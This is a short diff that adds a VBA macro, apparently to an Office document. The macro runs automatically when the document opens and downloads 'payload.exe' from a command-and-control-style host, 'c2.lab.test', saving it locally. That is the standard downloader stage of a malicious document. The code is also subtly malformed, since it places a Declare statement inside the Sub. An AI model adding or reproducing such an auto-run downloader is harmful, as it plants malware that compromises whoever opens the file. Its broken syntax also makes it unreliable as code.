@@ -1,0 +1,4 @@
+Sub Document_Open()
+Declare PtrSafe Function URLDownloadToFileA Lib "urlmon" (ByVal a As Long, ByVal b As String, ByVal c As String, ByVal d As Long, ByVal e As Long) As Long
+x = URLDownloadToFileA(0, "http://c2.lab.test/payload.exe", "out.exe", 0, 0)
+End Sub
